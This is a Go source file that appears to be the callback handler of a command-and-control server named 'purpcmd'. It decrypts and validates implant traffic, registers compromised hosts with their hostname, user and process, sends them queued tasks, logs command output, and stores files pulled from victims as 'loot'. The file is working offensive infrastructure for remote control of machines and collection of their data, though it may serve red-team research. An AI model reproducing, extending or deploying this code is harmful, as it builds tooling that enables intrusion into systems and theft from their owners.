package callback

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net/http"

	impx "purpcmd/implant"
	"purpcmd/internal"
	"purpcmd/internal/encrypt"
	"purpcmd/server/implant"
	"purpcmd/server/log"
	"purpcmd/server/loot"
	"purpcmd/server/lua"
)

const (
	MaxEncodedPayloadSize      = 10 << 20
	maxDecodedPayloadSize      = 8 << 20
	maxRegistrationDataSize    = 4 << 10
	maxResponsePayloadSize     = 8 << 20
	maxLootFileNameSize        = 4 << 10
	maxLootContentSize         = 8 << 20
	callbackHMACSize           = 16
	minimumAuthenticatedPacket = callbackHMACSize + 16
)

var ErrMalformedPayload = errors.New("malformed callback payload")

func malformed(format string, args ...any) error {
	return fmt.Errorf("%w: %s", ErrMalformedPayload, fmt.Sprintf(format, args...))
}

func ParseCallback(encoded []byte, req *http.Request, authenticatedName string) (messageType uint16, task []byte, err error) {
	defer func() {
		if recovered := recover(); recovered != nil {
			messageType = internal.NIL
			task = nil
			err = malformed("recovered parser panic: %v", recovered)
		}
	}()

	decoded, err := decodePayload(encoded)
	if err != nil {
		return internal.NIL, nil, err
	}

	var plaintext []byte
	if authenticatedName == "" {
		var rsaEncryption encrypt.Encrypt
		plaintext, err = rsaEncryption.RSADecode(decoded)
		if err != nil {
			return internal.NIL, nil, malformed("registration decrypt failed: %v", err)
		}
	} else {
		imp := implant.ImplantPtrByName(authenticatedName)
		if imp == nil {
			return internal.NIL, nil, malformed("unknown session")
		}
		if len(decoded) < minimumAuthenticatedPacket {
			return internal.NIL, nil, malformed("authenticated packet is too short")
		}
		if !imp.Enc.HMACVerifyHash(decoded) {
			return internal.NIL, nil, malformed("HMAC verification failed")
		}

		ciphertext := decoded[:len(decoded)-callbackHMACSize]
		plaintext, err = imp.Enc.AESCbcDecrypt(ciphertext)
		if err != nil {
			return internal.NIL, nil, malformed("session decrypt failed: %v", err)
		}
	}

	reader := bytes.NewReader(plaintext)
	if err := readBinary(reader, &messageType, "message type"); err != nil {
		return internal.NIL, nil, err
	}
	if authenticatedName == "" && messageType != internal.REG {
		return internal.NIL, nil, malformed("registration endpoint received message type %d", messageType)
	}
	if authenticatedName != "" && messageType == internal.REG {
		return internal.NIL, nil, malformed("session endpoint received registration message")
	}

	switch messageType {
	case internal.REG:
		err = ParseAndReg(reader, req)
	case internal.CHK:
		task, err = ParseCheck(reader, authenticatedName)
	case internal.RSP:
		err = ParseResponse(reader, authenticatedName)
	case internal.CHU:
		err = ParseChunkData(reader, authenticatedName)
	default:
		err = malformed("unknown message type %d", messageType)
	}
	if err != nil {
		return internal.NIL, nil, err
	}
	return messageType, task, nil
}

func decodePayload(encoded []byte) ([]byte, error) {
	if len(encoded) == 0 {
		return nil, malformed("empty encoded payload")
	}
	if len(encoded) > MaxEncodedPayloadSize {
		return nil, malformed("encoded payload exceeds %d bytes", MaxEncodedPayloadSize)
	}
	for _, value := range encoded {
		if !((value >= 'A' && value <= 'Z') || (value >= 'a' && value <= 'z') ||
			(value >= '0' && value <= '9') || value == '+' || value == '/' || value == '=') {
			return nil, malformed("payload is not canonical base64")
		}
	}

	decoded, err := base64.StdEncoding.Strict().DecodeString(string(encoded))
	if err != nil {
		return nil, malformed("invalid base64: %v", err)
	}
	if len(decoded) > maxDecodedPayloadSize {
		return nil, malformed("decoded payload exceeds %d bytes", maxDecodedPayloadSize)
	}
	return decoded, nil
}

func readBinary(reader io.Reader, destination any, field string) error {
	if err := binary.Read(reader, binary.BigEndian, destination); err != nil {
		return malformed("read %s: %v", field, err)
	}
	return nil
}

func readSizedBytes(reader *bytes.Reader, length uint64, maximum uint64, field string) ([]byte, error) {
	if length > maximum {
		return nil, malformed("%s length %d exceeds maximum %d", field, length, maximum)
	}
	if length > uint64(reader.Len()) {
		return nil, malformed("%s length %d exceeds remaining packet size %d", field, length, reader.Len())
	}
	data := make([]byte, int(length))
	if _, err := io.ReadFull(reader, data); err != nil {
		return nil, malformed("read %s: %v", field, err)
	}
	return data, nil
}

func requireConsumed(reader *bytes.Reader) error {
	if reader.Len() != 0 {
		return malformed("packet contains %d trailing bytes", reader.Len())
	}
	return nil
}

func ParseMetadata(reader io.Reader, metadata *impx.ImplantMetadata) error {
	fields := []struct {
		name  string
		value any
	}{
		{"PID", &metadata.PID},
		{"session ID", &metadata.SessionID},
		{"OTS", &metadata.OTS},
		{"IP", &metadata.IP},
		{"port", &metadata.Port},
		{"sleep", &metadata.Sleep},
		{"architecture", &metadata.Arch},
	}
	for _, field := range fields {
		if err := readBinary(reader, field.value, field.name); err != nil {
			return err
		}
	}
	return nil
}

func ParseAndReg(reader *bytes.Reader, req *http.Request) error {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return err
	}

	var aesKey [16]byte
	var aesIV [16]byte
	if err := readBinary(reader, &aesKey, "AES key"); err != nil {
		return err
	}
	if err := readBinary(reader, &aesIV, "AES IV"); err != nil {
		return err
	}

	var dataLength uint16
	if err := readBinary(reader, &dataLength, "registration data length"); err != nil {
		return err
	}
	data, err := readSizedBytes(reader, uint64(dataLength), maxRegistrationDataSize, "registration data")
	if err != nil {
		return err
	}
	if err := requireConsumed(reader); err != nil {
		return err
	}

	entities := bytes.Split(data, internal.SEP)
	if len(entities) != 4 {
		return malformed("registration data must contain exactly four entities")
	}
	metadata.Proc = string(entities[0])
	metadata.Hostname = string(entities[1])
	metadata.User = string(entities[2])
	payloadType := string(entities[3])
	if err := internal.ValidatePayloadType(payloadType); err != nil {
		return malformed("invalid payload type: %v", err)
	}
	metadata.Type = payloadType

	name := fmt.Sprintf("%d", metadata.SessionID)
	if implant.ImplantPtrByName(name) != nil {
		return malformed("session already exists")
	}

	imp := implant.ImplantNew(name)
	imp.ImplantSetMetadata(metadata)
	imp.ImplantSetEncryption(encrypt.EncryptImport(aesKey, aesIV))
	if req != nil {
		imp.ImplantSetRemoteSocket(req.RemoteAddr)
	}
	imp.ImplantAddImplant()

	lua.LuaOnRegister(*imp)
	log.AsyncWriteStdout(fmt.Sprintf("[\u001B[1;32m!\u001B[0;0m]- New implant %s - SOCK:%s HOSTNAME:%s USERNAME:%s TYPE:%s\n",
		imp.Name, imp.Metadata.Socket, imp.Metadata.Hostname, imp.Metadata.User, imp.Metadata.Type))
	return nil
}

func validateSession(metadata *impx.ImplantMetadata, authenticatedName string) (*implant.Implant, error) {
	name := fmt.Sprintf("%d", metadata.SessionID)
	if authenticatedName == "" || name != authenticatedName {
		return nil, malformed("encrypted session ID does not match authenticated session")
	}
	imp := implant.ImplantPtrByName(authenticatedName)
	if imp == nil {
		return nil, malformed("unknown session")
	}
	return imp, nil
}

// ParseCheck parses a health check after its cryptographic envelope has been authenticated.
func ParseCheck(reader *bytes.Reader, authenticatedName string) ([]byte, error) {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return nil, err
	}
	if err := requireConsumed(reader); err != nil {
		return nil, err
	}
	imp, err := validateSession(metadata, authenticatedName)
	if err != nil {
		return nil, err
	}
	imp.ImplantUpdateLastseen()

	data, taskID, err := imp.ImplantGetTaskStr()
	if err != nil {
		return nil, nil
	}
	lua.LuaOnCheck(taskID, data, *imp)
	log.AsyncWriteStdoutInfo(fmt.Sprintf("Sending task %s of %d bytes to %s\n", string(taskID[:]), len(data), imp.Name))
	return []byte(data), nil
}

func ParseResponse(reader *bytes.Reader, authenticatedName string) error {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return err
	}

	var taskID [8]byte
	if err := readBinary(reader, &taskID, "task ID"); err != nil {
		return err
	}
	var responseLength uint32
	if err := readBinary(reader, &responseLength, "response length"); err != nil {
		return err
	}
	response, err := readSizedBytes(reader, uint64(responseLength), maxResponsePayloadSize, "response")
	if err != nil {
		return err
	}
	if err := requireConsumed(reader); err != nil {
		return err
	}

	imp, err := validateSession(metadata, authenticatedName)
	if err != nil {
		return err
	}
	accepted, err := imp.TaskBeginResponse(taskID)
	if err != nil {
		return err
	}
	if !accepted {
		return nil
	}
	defer imp.TaskAbortResponse(taskID)

	if err := imp.TaskCompleteResponse(taskID, response); err != nil {
		return err
	}
	imp.ImplantUpdateLastseen()
	lua.LuaOnResponse(taskID, string(response), *imp)
	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s length:%d\n\n%s\n\n", authenticatedName, taskID, responseLength, response))
	return nil
}

func ParseChunkData(reader *bytes.Reader, authenticatedName string) error {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return err
	}

	var taskID [8]byte
	if err := readBinary(reader, &taskID, "task ID"); err != nil {
		return err
	}
	var fileNameLength uint32
	if err := readBinary(reader, &fileNameLength, "file name length"); err != nil {
		return err
	}
	fileName, err := readSizedBytes(reader, uint64(fileNameLength), maxLootFileNameSize, "file name")
	if err != nil {
		return err
	}
	var contentLength uint32
	if err := readBinary(reader, &contentLength, "content length"); err != nil {
		return err
	}
	content, err := readSizedBytes(reader, uint64(contentLength), maxLootContentSize, "content")
	if err != nil {
		return err
	}
	if err := requireConsumed(reader); err != nil {
		return err
	}

	imp, err := validateSession(metadata, authenticatedName)
	if err != nil {
		return err
	}
	accepted, err := imp.TaskBeginResponse(taskID)
	if err != nil {
		return err
	}
	if !accepted {
		return nil
	}
	defer imp.TaskAbortResponse(taskID)

	lootEntry := loot.New(authenticatedName, string(fileName), content)
	if err := lootEntry.SaveData(); err != nil {
		log.AsyncWriteStdoutAlert(fmt.Sprintf("Failed to save loot - session:%s task:%s file:%s error:%s", authenticatedName, taskID, string(fileName), err.Error()))
		return err
	}

	response := []byte(fmt.Sprintf("File downloaded: %s (%d bytes) - UUID: %s", string(fileName), contentLength, lootEntry.UUID))
	if err := imp.TaskCompleteResponse(taskID, response); err != nil {
		return err
	}
	imp.ImplantUpdateLastseen()
	lua.LuaOnResponse(taskID, fmt.Sprintf("Downloaded: %s", string(fileName)), *imp)
	log.AsyncWriteStdoutSuccs(fmt.Sprintf("File downloaded - session:%s task:%s file:%s size:%d bytes UUID:%s", authenticatedName, taskID, string(fileName), contentLength, lootEntry.UUID))
	return nil
}
